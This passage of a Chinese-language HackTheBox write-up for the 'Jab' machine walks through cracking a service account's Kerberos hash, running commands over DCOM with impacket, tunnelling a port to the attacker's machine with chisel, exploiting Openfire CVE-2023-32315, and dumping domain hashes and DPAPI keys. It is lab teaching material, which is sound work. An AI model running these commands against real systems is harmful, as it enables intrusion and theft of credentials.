class="line">$krb5tgs$23$*svc_openfire$JAB.HTB$jab.htb/svc_openfire*$de17a01e2449626571bd9416dd4e3d46$4fea18693e1cb97f3e096288a76204437f115fe49b9611e339154e0effb1d0fcccfbbbb219da829b0ac70e8420f2f35a4f315c5c6f1d4ad3092e14ccd506e9a3bd3d20854ec73e62859cd68a7e6169f3c0b5ab82064b04df4ff7583ef18bbd42ac529a5747102c2924d1a76703a30908f5ad41423b2fff5e6c03d3df6c0635a41bea1aca3e15986639c758eef30b74498a184380411e207e5f3afef185eaf605f543c436cd155823b7a7870a3d5acd0b785f999facd8b7ffdafe6e0410af26efc42417d402f2819d03b3730203b59c21b0434e2e0e7a97ed09e3901f523ba52fe9d3ee7f4203de9e857761fbcb417d047765a5a01e71aff732e5d5d114f0b58a8a0df4ca7e1ff5a88c532f5cf33f2e01986ac44a353c0142b0360e1b839bb6889a54fbd9c549da23fb05193a4bfba179336e7dd69380bc4f9c3c00324e42043ee54b3017a913f84a20894e145b23b440aff9c524efb7957dee89b1e7b735db292ca5cb32cf024e9b8f5546c33caa36f5370db61a9a3facb473e741c61ec7dbee7420c188e31b0d920f06b7ffc1cb86ace5db0f9eeaf8c13bcca743b6bf8b2ece99dd58aff354f5b4a78ffcd9ad69ad8e7812a2952806feb9b411fe53774f92f9e8889380dddcb59de09320094b751a0c938ecc762cbd5d57d4e0c3d660e88545cc96e324a6fef226bc62e2bb31897670929571cd728b43647c03e44867b148428c9dc917f1dc4a0331517b65aa52221fcfe9499017ab4e6216ced3db5837d10ad0d15e07679b56c6a68a97c1e851238cef84a78754ff5c08d31895f0066b727449575a1187b19ad8604d583ae07694238bae2d4839fb20830f77fffb39f9d6a38c1c0d524130a6307125509422498f6c64adc030bfcf616c4c0d3e0fa76dcde0dfc5c94a4cb07ccf4cac941755cfdd1ed94e37d90bd1b612fee2ced175aa0e01f2919e31614f72c1ff7316be4ee71e80e0626b787c9f017504fa717b03c94f38fe9d682542d3d7edaff777a8b2d3163bc83c5143dc680c7819f405ec207b7bec51dabcec4896e110eb4ed0273dd26c82fc54bb2b5a1294cb7f3b654a13b4530bc186ff7fe3ab5a802c7c91e664144f92f438aecf9f814f73ed556dac403daaefcc7081957177d16c1087f058323f7aa3dfecfa024cc842aa3c8ef82213ad4acb89b88fc7d1f68338e8127644cfe101bf93b18ec0da457c9136e3d0efa0d094994e1591ecc4:!@#$%^&amp;*(1qazxsw</span><br><span class="line">                                               </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Name........: Kerberos 5, etype 23, TGS-REP</span><br><span class="line">Hash.Target......: $krb5tgs$23$*svc_openfire$JAB.HTB$jab.htb/svc_openf...91ecc4</span><br><span class="line">Time.Started.....: Fri Oct 27 15:30:12 2023 (17 secs)</span><br><span class="line">Time.Estimated...: Fri Oct 27 15:30:29 2023 (0 secs)</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........:   873.9 kH/s (10.16ms) @ Accel:64 Loops:1 Thr:64 Vec:8</span><br><span class="line">Recovered........: 1/1 (100.00%) Digests</span><br><span class="line">Progress.........: 14344385/14344385 (100.00%)</span><br><span class="line">Rejected.........: 0/14344385 (0.00%)</span><br><span class="line">Restore.Point....: 14336000/14344385 (99.94%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br><span class="line">Candidates.#1....: $HEX[2321686f74746965] -&gt; $HEX[042a0337c2a156616d6f732103]</span><br><span class="line"> </span><br><span class="line">Started: Fri Oct 27 15:30:09 2023</span><br><span class="line">Stopped: Fri Oct 27 15:30:29 2023</span><br><span class="line"></span><br><span class="line">(11/22/23 03:31:57) adunn: I&#x27;ll pass this along and circle back with the group</span><br><span class="line">(11/22/23 03:32:23) bdavis: perfect, thanks Angela!</span><br><span class="line">(11/22/23 02:22:55) The topic is: </span><br><span class="line">(02/26/24 22:17:11) jmontgomery: ..</span><br></pre></td></tr></table></figure>
+
+<p>很直接的告訴你賬號和密碼，使用crackmapexec 去看看憑證是否正確：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb 10.129.225.75 -u <span class="string">&#x27;svc_openfire&#x27;</span> -p <span class="string">&#x27;!@#$%^&amp;*(1qazxsw&#x27;</span></span><br><span class="line">SMB         10.129.225.75   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:jab.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.129.225.75   445    DC01             [+] jab.htb\svc_openfire:!@<span class="comment">#$%^&amp;*(1qazxsw</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226222142-8rgp9xo.png" alt="image">​</p>
+<blockquote>
+<p>The user <a href="mailto:&#x53;&#x56;&#x43;&#95;&#79;&#x50;&#x45;&#78;&#x46;&#x49;&#82;&#x45;&#64;&#74;&#65;&#x42;&#x2e;&#x48;&#x54;&#x42;">&#x53;&#x56;&#x43;&#95;&#79;&#x50;&#x45;&#78;&#x46;&#x49;&#82;&#x45;&#64;&#74;&#65;&#x42;&#x2e;&#x48;&#x54;&#x42;</a> has membership in the Distributed COM Users local group on the computer DC01.JAB.HTB.</p>
+<p>This can allow code execution under certain conditions by instantiating a COM object on a remote machine and invoking its methods.<br>Help: ExecuteDCOM</p>
+</blockquote>
+<p>使用DCOM去執行一個shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-dcomexec -silentcommand -object MMC20 -debug -dc-ip 10.129.225.75 jab.local/svc_openfire:<span class="string">&#x27;!@#$%^&amp;*(1qazxsw&#x27;</span>@10.129.225.75 <span class="string">&quot;ping 10.10.16.21&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226222855-55mfhk0.png" alt="image">​</p>
+<h2 id="Shell-in-the-box"><a href="#Shell-in-the-box" class="headerlink" title="Shell in the box"></a>Shell in the box</h2><p>既然可以執行一個shell，那就可以放一個reverse tcp shell。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\mane&gt; whoami</span><br><span class="line">jab\svc_openfire</span><br></pre></td></tr></table></figure>
+
+<p>枚舉了一下，看到了端口 9090 有一個服務開著，然後本地轉發看看：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel.exe client <span class="number">10.10</span>.<span class="number">16.21</span>:<span class="number">3333</span> <span class="built_in">R</span>:<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9090</span>:<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9090</span></span><br></pre></td></tr></table></figure>
+
+<p>打開：<code>http://127.0.0.1:9090/</code>​， 使用 <code>svc_openfire</code>​ 的賬號登陸進去，看到版本：<code>Openfire 4.7.5, build ee4395e</code>​，</p>
+<p>於是上網搜索 <code>Openfire 4.7.5 exploit</code>​ ，找到 <code>CVE-2023-32315</code>​，然後搜索： <code>CVE-2023-32315 github POC</code>​ ，找到這個：</p>
+<blockquote>
+<ol>
+<li>Run exploit</li>
+<li>login with newly added user</li>
+<li>goto tab plugin &gt; upload plugin <code>openfire-management-tool-plugin.jar</code>​</li>
+<li>goto tab server &gt; server settings &gt; Management tool</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://github.com/miko550/CVE-2023-32315">https://github.com/miko550/CVE-2023-32315</a></p>
+</blockquote>
+<p>根據提示只需要把插件上傳上去就可以了。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226231352-jx01d55.png" alt="image">​</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226231441-0uprfps.png" alt="image">​</p>
+<p>使用密碼 123 ，來到執行命令的地方：</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226231517-rvt1yzl.png" alt="image">​</p>
+<p>Root！</p>
+<p>‍</p>
+<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes:"></a>Hashes:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x88e518c4be9dad87d51f7425fe88bb61</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:<span class="built_in">hash</span>)</span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] <span class="variable">$MACHINE</span>.ACC</span><br><span class="line"><span class="variable">$MACHINE</span>.ACC:plain_password_hex:df54ebdea87054fc0373d03782ebed590b1415770994e8c2b60d6f7c197e89e613011d6a252619ab85169b95fc59148c24c8055096950f4845572ff9facc4b4201f258e5dc3a21ba7b935a2e1233169f2da3742adde3e592d6e24f11308d3478c431d8ff090c8ae435b8d63159dfce5ef8104c068ae8d64776c3793bb028ca100b5f607c3af0b4765d45b00de96363d49cad8df77ae61cdbf10fef7c25df8e53a813efea7e68069f00b3b79f2c82fb13424e814f880d60513455cfac94df147b721fa7503b6723f09767c4c6235eca373847c36837397a5a3293f5f6eea49f1740b22609b81eae2efb70a6777bea2c4c</span><br><span class="line"><span class="variable">$MACHINE</span>.ACC: aad3b435b51404eeaad3b435b51404ee:ba08959c2856021560b66c33530f0a0e</span><br><span class="line">[*] <span class="variable">$MACHINE</span>.ACC_history</span><br><span class="line"><span class="variable">$MACHINE</span>.ACC:plain_password_hex:81a7a5eb4726e5cebc3b6d82df80293e688d2e4c3c9732e5854fed3248a52def52c85d309a8818a7a22acbd31735b885e820380acceb5cf2ab27f1e222547a79bb23482ea26bbf9af6ad4c3404878385e064bcb08e2fa69d11f1362d28ec27137a1224a6cab06ea35dd05166ec15b7c5a98950621f4304640af3ac924b57903ae8ae950e7aaec1bf58abad7a36594e981b00ffa1395e29049b46cff6c4f7fff0f15b477784f4878156c2d149f3307f3380ce96ca343951b4650a071d027f3e3493c7a817073f911b8d0691a5b67a5fe0c3783014b860c67035d1400503cf9939f3291f77f8871d17dd22754eafc66c7a</span><br><span class="line"><span class="variable">$MACHINE</span>.ACC: aad3b435b51404eeaad3b435b51404ee:2d64ffb1f3a947816872a507340719ce</span><br><span class="line">[*] DefaultPassword</span><br><span class="line">(Unknown User):Welcome1</span><br><span class="line">[*] DPAPI_SYSTEM</span><br><span class="line">dpapi_machinekey:0x0ef4a210464b7500df0635e691d5d1f5ac1fdbe7</span><br><span class="line">dpapi_userkey:0x2b24c583d0dc8b6eef7f2aac2cd203ec5f5b383e</span><br><span class="line">[*] DPAPI_SYSTEM_history</span><br><span class="line">dpapi_machinekey:0x37823e7019ea25745d184bbc39ceaa63d88a4fa0</span><br><span class="line">dpapi_userkey:0x645c248b9bf5ac21e3bf78aaa879f41a00cb29a9</span><br><span class="line">[*] NL<span class="variable">$KM</span></span><br><span class="line"> 0000   62 F1 2A 94 DC 92 35 C7  23 E3 D3 AF 4E A1 56 95   b.*...5.<span class="comment">#...N.V.</span></span><br><span class="line"> 0010   B8 F1 68 A5 7F D4 01 0C  F8 4F 5D 85 15 79 65 C8   ..h......O]..ye.</span><br><span class="line"> 0020   D9 56 06 FB CE AD 12 F0  01 F7 8E E5 C1 15 92 43   .V.............C</span><br><span class="line"> 0030   F4 33 E7 53 85 F4 B9 7E  F1 CB 9F 14 F4 6F 83 B3   .3.S...~.....o..</span><br><span class="line">NL<span class="variable">$KM</span>:62f12a94dc9235c723e3d3af4ea15695b8f168a57fd4010cf84f5d85157965c8d95606fbcead12f001f78ee5c1159243f433e75385f4b97ef1cb9f14f46f83b3</span><br><span class="line">[*] NL<span class="variable">$KM_history</span></span><br><span class="line"> 0000   62 F1 2A 94 DC 92 35 C7  23 E3 D3 AF 4E A1 56 95   b.*...5.<span class="comment">#...N.V.</span></span><br><span class="line"> 0010   B8 F1 68 A5 7F D4 01 0C  F8 4F 5D 85 15 79 65 C8   ..h......O]..ye.</span><br><span class="line"> 0020   D9 56 06 FB CE AD 12 F0  01 F7 8E E5 C1 15 92 43   .V.............C</span><br><span class="line"> 0030   F4 33 E7 53 85 F4 B9 7E  F1 CB 9F 14 F4 6F 83 B3   .3.S...~.....o..</span><br><span class="line">NL<span class="variable">$KM_history</span>:62f12a94dc9235c723e3d3af4ea15695b8f168a57fd4010cf84f5d85157965c8d95606fbcead12f001f78ee5c1159243f433e75385f4b97ef1cb9f14f46f83b3</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching <span class="keyword">for</span> pekList, be patient</span><br><span class="line">[*] PEK <span class="comment"># 0 found and decrypted: fe58a54e3c6bfd0d9ae5690fc60ae5ec</span></span><br><span class="line">[*] Reading and decrypting hashes from ntds.dit</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1622aacbe4e96bda28831e653ba288c:::</span><br><span class="line">Administrator_history0:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::</span><br><span class="line">Administrator_history1:500:aad3b435b51404eeaad3b435b51404ee:b1622aacbe4e96bda28831e653ba288c:::</span><br><span class="line">Administrator_history2:500:aad3b435b51404eeaad3b435b51404ee:ab297867335ac5f068ebc7dec366da12:::</span><br><span class="line">Administrator_history3:500:aad3b435b51404eeaad3b435b51404ee:ab297867335ac5f068ebc7dec366da12:::</span><br><span class="line">Administrator_history4:500:aad3b435b51404eeaad3b435b51404ee:dbcf3ea7f95ade329c57dd0679b99cc3:::</span><br><span class="line">Administrator_history5:500:aad3b435b51404eeaad3b435b51404ee:dbcf3ea7f95ade329c57dd0679b99cc3:::</span><br><span class="line">Administrator_history6:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DC01$:1001:aad3b435b51404eeaad3b435b51404ee:ba08959c2856021560b66c33530f0a0e:::</span><br><span class="line">DC01<span class="variable">$_history0</span>:1001:aad3b435b51404eeaad3b435b51404ee:2d64ffb1f3a947816872a507340719ce:::</span><br><span class="line">DC01<span class="variable">$_history1</span>:1001:aad3b435b51404eeaad3b435b51404ee:f693ffea1823ad2c193ba5e7f6703972:::</span><br><span class="line">DC01<span class="variable">$_history2</span>:1001:aad3b435b51404eeaad3b435b51404ee:cdd2f7e2c90d778da389f9fb086992c5:::</span><br></pre></td></tr></table></figure>
+
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you really like my writeups, please use this link to sign up for an HTB Academy account to show my appreciation.</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你真的喜歡我寫的writeup，請使用這個鏈接注冊一個 HTB Academy 賬號，以表達我的感謝。</a></p>
+<p>如果你是新手，使用上面的鏈接加入 HTB 的 academy 就可以免費看 Tire 0 的所有教程，這對初學者來説是很友好的。 （建議先完成 INTRODUCTION TO ACADEMY）</p>
+<p>If you are a beginner, join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4 .level-5 .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/&text=HackTheBox - Machine - Jab"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/&title=HackTheBox - Machine - Jab"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/&is_video=false&description=HackTheBox - Machine - Jab"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Jab&body=Check out this article: https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/&title=HackTheBox - Machine - Jab"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/&title=HackTheBox - Machine - Jab"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/&title=HackTheBox - Machine - Jab"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/&title=HackTheBox - Machine - Jab"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/&name=HackTheBox - Machine - Jab&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/&t=HackTheBox - Machine - Jab"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
